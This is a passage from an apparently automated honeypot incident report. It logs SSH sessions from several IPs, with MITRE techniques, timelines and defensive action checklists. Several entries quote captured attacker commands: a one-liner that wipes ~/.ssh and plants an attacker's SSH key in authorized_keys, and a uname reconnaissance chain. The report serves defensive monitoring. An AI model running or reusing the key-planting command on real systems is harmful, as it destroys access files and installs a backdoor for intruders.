| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:54:52` | `cowrie.session.connect` |
| `2026-09-25 18:54:52` | `cowrie.client.version` |
| `2026-09-25 18:54:52` | `cowrie.client.kex` |
| `2026-09-25 18:54:53` | `cowrie.login.success` |
| `2026-09-25 18:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.128.6[.]159` to AbuseIPDB if not already reported
- [ ] Block `203.128.6[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-221f5dd067d8

| Field | Detail |
|---|---|
| **Source IP** | `203.128.6[.]159` |
| **First Seen** | 2026-09-25 18:54 |
| **Last Seen** | 2026-09-25 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:54:54` | `cowrie.session.connect` |
| `2026-09-25 18:54:54` | `cowrie.client.version` |
| `2026-09-25 18:54:54` | `cowrie.client.kex` |
| `2026-09-25 18:54:55` | `cowrie.login.success` |
| `2026-09-25 18:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.128.6[.]159` to AbuseIPDB if not already reported
- [ ] Block `203.128.6[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2a12a6e1a9f

| Field | Detail |
|---|---|
| **Source IP** | `103.70.40[.]36` |
| **First Seen** | 2026-09-25 18:55 |
| **Last Seen** | 2026-09-25 18:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:55:39` | `cowrie.session.connect` |
| `2026-09-25 18:55:39` | `cowrie.client.version` |
| `2026-09-25 18:55:40` | `cowrie.client.kex` |
| `2026-09-25 18:55:41` | `cowrie.login.success` |
| `2026-09-25 18:55:42` | `cowrie.session.params` |
| `2026-09-25 18:55:42` | `cowrie.command.input` |
| `2026-09-25 18:55:42` | `cowrie.command.failed` |
| `2026-09-25 18:55:43` | `cowrie.log.closed` |
| `2026-09-25 18:55:43` | `cowrie.session.params` |
| `2026-09-25 18:55:43` | `cowrie.command.input` |
| `2026-09-25 18:55:44` | `cowrie.session.file_download` |
| `2026-09-25 18:55:44` | `cowrie.log.closed` |
| `2026-09-25 18:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.70.40[.]36` to AbuseIPDB if not already reported
- [ ] Block `103.70.40[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f30bf6cbd4c

| Field | Detail |
|---|---|
| **Source IP** | `103.70.40[.]36` |
| **First Seen** | 2026-09-25 18:55 |
| **Last Seen** | 2026-09-25 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:55:44` | `cowrie.session.connect` |
| `2026-09-25 18:55:44` | `cowrie.client.version` |
| `2026-09-25 18:55:44` | `cowrie.client.kex` |
| `2026-09-25 18:55:46` | `cowrie.login.success` |
| `2026-09-25 18:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.70.40[.]36` to AbuseIPDB if not already reported
- [ ] Block `103.70.40[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-945162fdde6f

| Field | Detail |
|---|---|
| **Source IP** | `103.70.40[.]36` |
| **First Seen** | 2026-09-25 18:55 |
| **Last Seen** | 2026-09-25 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:55:46` | `cowrie.session.connect` |
| `2026-09-25 18:55:46` | `cowrie.client.version` |
| `2026-09-25 18:55:46` | `cowrie.client.kex` |
| `2026-09-25 18:55:48` | `cowrie.login.success` |
| `2026-09-25 18:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.70.40[.]36` to AbuseIPDB if not already reported
- [ ] Block `103.70.40[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b5834191899

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:56 |
| **Last Seen** | 2026-09-25 18:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:56:10` | `cowrie.session.connect` |
| `2026-09-25 18:56:11` | `cowrie.client.version` |
| `2026-09-25 18:56:11` | `cowrie.client.kex` |
| `2026-09-25 18:56:12` | `cowrie.login.success` |
| `2026-09-25 18:56:13` | `cowrie.session.params` |
| `2026-09-25 18:56:13` | `cowrie.command.input` |
| `2026-09-25 18:56:13` | `cowrie.command.input` |
| `2026-09-25 18:56:13` | `cowrie.command.input` |
| `2026-09-25 18:56:13` | `cowrie.command.input` |
| `2026-09-25 18:56:13` | `cowrie.command.input` |
| `2026-09-25 18:56:13` | `cowrie.command.success` |
| `2026-09-25 18:56:13` | `cowrie.command.input` |
| `2026-09-25 18:56:13` | `cowrie.command.input` |
| `2026-09-25 18:56:13` | `cowrie.command.input` |
| `2026-09-25 18:56:13` | `cowrie.command.input` |
| `2026-09-25 18:56:14` | `cowrie.log.closed` |
| `2026-09-25 18:56:15` | `cowrie.session.params` |
| `2026-09-25 18:56:15` | `cowrie.command.input` |
| `2026-09-25 18:56:16` | `cowrie.log.closed` |
| `2026-09-25 18:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9690a6091fc0

| Field | Detail |
|---|---|
| **Source IP** | `85.133.193[.]72` |
| **First Seen** | 2026-09-25 18:56 |
| **Last Seen** | 2026-09-25 18:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:56:14` | `cowrie.session.connect` |
| `2026-09-25 18:56:14` | `cowrie.client.version` |
| `2026-09-25 18:56:14` | `cowrie.client.kex` |
| `2026-09-25 18:56:14` | `cowrie.login.success` |
| `2026-09-25 18:56:16` | `cowrie.session.params` |
| `2026-09-25 18:56:16` | `cowrie.command.input` |
| `2026-09-25 18:56:16` | `cowrie.command.failed` |
| `2026-09-25 18:56:16` | `cowrie.log.closed` |
| `2026-09-25 18:56:17` | `cowrie.session.params` |
| `2026-09-25 18:56:17` | `cowrie.command.input` |
| `2026-09-25 18:56:17` | `cowrie.session.file_download` |
| `2026-09-25 18:56:17` | `cowrie.log.closed` |
| `2026-09-25 18:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.133.193[.]72` to AbuseIPDB if not already reported
- [ ] Block `85.133.193[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0e0b6a0114a

| Field | Detail |
|---|---|
| **Source IP** | `85.133.193[.]72` |
| **First Seen** | 2026-09-25 18:56 |
| **Last Seen** | 2026-09-25 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:56:17` | `cowrie.session.connect` |
| `2026-09-25 18:56:17` | `cowrie.client.version` |
| `2026-09-25 18:56:18` | `cowrie.client.kex` |
| `2026-09-25 18:56:18` | `cowrie.login.success` |
| `2026-09-25 18:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.133.193[.]72` to AbuseIPDB if not already reported
- [ ] Block `85.133.193[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1939b4c5848

| Field | Detail |
|---|---|
| **Source IP** | `85.133.193[.]72` |
| **First Seen** | 2026-09-25 18:56 |
| **Last Seen** | 2026-09-25 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:56:19` | `cowrie.session.connect` |
| `2026-09-25 18:56:19` | `cowrie.client.version` |
| `2026-09-25 18:56:19` | `cowrie.client.kex` |
| `2026-09-25 18:56:19` | `cowrie.login.success` |
| `2026-09-25 18:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.133.193[.]72` to AbuseIPDB if not already reported
- [ ] Block `85.133.193[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c466816b0747

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:58 |
| **Last Seen** | 2026-09-25 18:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:58:03` | `cowrie.session.connect` |
| `2026-09-25 18:58:03` | `cowrie.client.version` |
| `2026-09-25 18:58:03` | `cowrie.client.kex` |
| `2026-09-25 18:58:05` | `cowrie.login.success` |
| `2026-09-25 18:58:06` | `cowrie.session.params` |
| `2026-09-25 18:58:06` | `cowrie.command.input` |
| `2026-09-25 18:58:06` | `cowrie.command.input` |
| `2026-09-25 18:58:06` | `cowrie.command.input` |
| `2026-09-25 18:58:06` | `cowrie.command.input` |
| `2026-09-25 18:58:06` | `cowrie.command.input` |
| `2026-09-25 18:58:06` | `cowrie.command.success` |
| `2026-09-25 18:58:06` | `cowrie.command.input` |
| `2026-09-25 18:58:06` | `cowrie.command.input` |
| `2026-09-25 18:58:06` | `cowrie.command.input` |
| `2026-09-25 18:58:06` | `cowrie.command.input` |
| `2026-09-25 18:58:06` | `cowrie.log.closed` |
| `2026-09-25 18:58:07` | `cowrie.session.params` |
| `2026-09-25 18:58:07` | `cowrie.command.input` |
| `2026-09-25 18:58:08` | `cowrie.log.closed` |
| `2026-09-25 18:58:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87019499715f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:59 |
| **Last Seen** | 2026-09-25 19:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:59:58` | `cowrie.session.connect` |
| `2026-09-25 18:59:58` | `cowrie.client.version` |
| `2026-09-25 18:59:58` | `cowrie.client.kex` |
| `2026-09-25 19:00:00` | `cowrie.login.success` |
| `2026-09-25 19:00:01` | `cowrie.session.params` |
| `2026-09-25 19:00:01` | `cowrie.command.input` |
| `2026-09-25 19:00:01` | `cowrie.command.input` |
| `2026-09-25 19:00:01` | `cowrie.command.input` |
| `2026-09-25 19:00:01` | `cowrie.command.input` |
| `2026-09-25 19:00:01` | `cowrie.command.input` |
| `2026-09-25 19:00:01` | `cowrie.command.success` |
| `2026-09-25 19:00:01` | `cowrie.command.input` |
| `2026-09-25 19:00:01` | `cowrie.command.input` |
| `2026-09-25 19:00:01` | `cowrie.command.input` |
| `2026-09-25 19:00:01` | `cowrie.command.input` |
| `2026-09-25 19:00:01` | `cowrie.log.closed` |
| `2026-09-25 19:00:03` | `cowrie.session.params` |
| `2026-09-25 19:00:03` | `cowrie.command.input` |
| `2026-09-25 19:00:03` | `cowrie.log.closed` |
| `2026-09-25 19:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-103263cbe92d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.191[.]5` |
| **First Seen** | 2026-09-25 19:01 |
| **Last Seen** | 2026-09-25 19:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:01:39` | `cowrie.session.connect` |
| `2026-09-25 19:01:39` | `cowrie.client.version` |
| `2026-09-25 19:01:40` | `cowrie.client.kex` |
| `2026-09-25 19:01:40` | `cowrie.login.success` |
| `2026-09-25 19:01:41` | `cowrie.session.params` |
| `2026-09-25 19:01:41` | `cowrie.command.input` |
| `2026-09-25 19:01:41` | `cowrie.command.failed` |
| `2026-09-25 19:01:41` | `cowrie.log.closed` |
| `2026-09-25 19:01:42` | `cowrie.session.params` |
| `2026-09-25 19:01:42` | `cowrie.command.input` |
| `2026-09-25 19:01:42` | `cowrie.session.file_download` |
| `2026-09-25 19:01:42` | `cowrie.log.closed` |
| `2026-09-25 19:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.191[.]5` to AbuseIPDB if not already reported
- [ ] Block `195.178.191[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6a71e6e12a5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.191[.]5` |
| **First Seen** | 2026-09-25 19:01 |
| **Last Seen** | 2026-09-25 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:01:42` | `cowrie.session.connect` |
| `2026-09-25 19:01:42` | `cowrie.client.version` |
| `2026-09-25 19:01:43` | `cowrie.client.kex` |
| `2026-09-25 19:01:43` | `cowrie.login.success` |
| `2026-09-25 19:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.191[.]5` to AbuseIPDB if not already reported
- [ ] Block `195.178.191[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e85ce98d324b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.191[.]5` |
| **First Seen** | 2026-09-25 19:01 |
| **Last Seen** | 2026-09-25 19:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:01:44` | `cowrie.session.connect` |
| `2026-09-25 19:01:44` | `cowrie.client.version` |
| `2026-09-25 19:01:44` | `cowrie.client.kex` |
| `2026-09-25 19:01:44` | `cowrie.login.success` |
| `2026-09-25 19:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.191[.]5` to AbuseIPDB if not already reported
- [ ] Block `195.178.191[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d577591ffdd6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:01 |
| **Last Seen** | 2026-09-25 19:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:01:53` | `cowrie.session.connect` |
| `2026-09-25 19:01:54` | `cowrie.client.version` |
| `2026-09-25 19:01:54` | `cowrie.client.kex` |
| `2026-09-25 19:01:55` | `cowrie.login.success` |
| `2026-09-25 19:01:57` | `cowrie.session.params` |
| `2026-09-25 19:01:57` | `cowrie.command.input` |
| `2026-09-25 19:01:57` | `cowrie.command.input` |
| `2026-09-25 19:01:57` | `cowrie.command.input` |
| `2026-09-25 19:01:57` | `cowrie.command.input` |
| `2026-09-25 19:01:57` | `cowrie.command.input` |
| `2026-09-25 19:01:57` | `cowrie.command.success` |
| `2026-09-25 19:01:57` | `cowrie.command.input` |
| `2026-09-25 19:01:57` | `cowrie.command.input` |
| `2026-09-25 19:01:57` | `cowrie.command.input` |
| `2026-09-25 19:01:57` | `cowrie.command.input` |
| `2026-09-25 19:01:57` | `cowrie.log.closed` |
| `2026-09-25 19:01:59` | `cowrie.session.params` |
| `2026-09-25 19:01:59` | `cowrie.command.input` |
| `2026-09-25 19:01:59` | `cowrie.log.closed` |
| `2026-09-25 19:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e87e6f1c39f5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:03 |
| **Last Seen** | 2026-09-25 19:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:03:41` | `cowrie.session.connect` |
| `2026-09-25 19:03:42` | `cowrie.client.version` |
| `2026-09-25 19:03:42` | `cowrie.client.kex` |
| `2026-09-25 19:03:43` | `cowrie.login.success` |
| `2026-09-25 19:03:45` | `cowrie.session.params` |
| `2026-09-25 19:03:45` | `cowrie.command.input` |
| `2026-09-25 19:03:45` | `cowrie.command.input` |
| `2026-09-25 19:03:45` | `cowrie.command.input` |
| `2026-09-25 19:03:45` | `cowrie.command.input` |
| `2026-09-25 19:03:45` | `cowrie.command.input` |
| `2026-09-25 19:03:45` | `cowrie.command.success` |
| `2026-09-25 19:03:45` | `cowrie.command.input` |
| `2026-09-25 19:03:45` | `cowrie.command.input` |
| `2026-09-25 19:03:45` | `cowrie.command.input` |
| `2026-09-25 19:03:45` | `cowrie.command.input` |
| `2026-09-25 19:03:45` | `cowrie.log.closed` |
| `2026-09-25 19:03:47` | `cowrie.session.params` |
| `2026-09-25 19:03:47` | `cowrie.command.input` |
| `2026-09-25 19:03:47` | `cowrie.log.closed` |
| `2026-09-25 19:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f35cd725a1f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:05 |
| **Last Seen** | 2026-09-25 19:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:05:34` | `cowrie.session.connect` |
| `2026-09-25 19:05:34` | `cowrie.client.version` |
| `2026-09-25 19:05:34` | `cowrie.client.kex` |
| `2026-09-25 19:05:36` | `cowrie.login.success` |
| `2026-09-25 19:05:37` | `cowrie.session.params` |
| `2026-09-25 19:05:37` | `cowrie.command.input` |
| `2026-09-25 19:05:37` | `cowrie.command.input` |
| `2026-09-25 19:05:37` | `cowrie.command.input` |
| `2026-09-25 19:05:37` | `cowrie.command.input` |
| `2026-09-25 19:05:37` | `cowrie.command.input` |
| `2026-09-25 19:05:37` | `cowrie.command.success` |
| `2026-09-25 19:05:37` | `cowrie.command.input` |
| `2026-09-25 19:05:37` | `cowrie.command.input` |
| `2026-09-25 19:05:37` | `cowrie.command.input` |
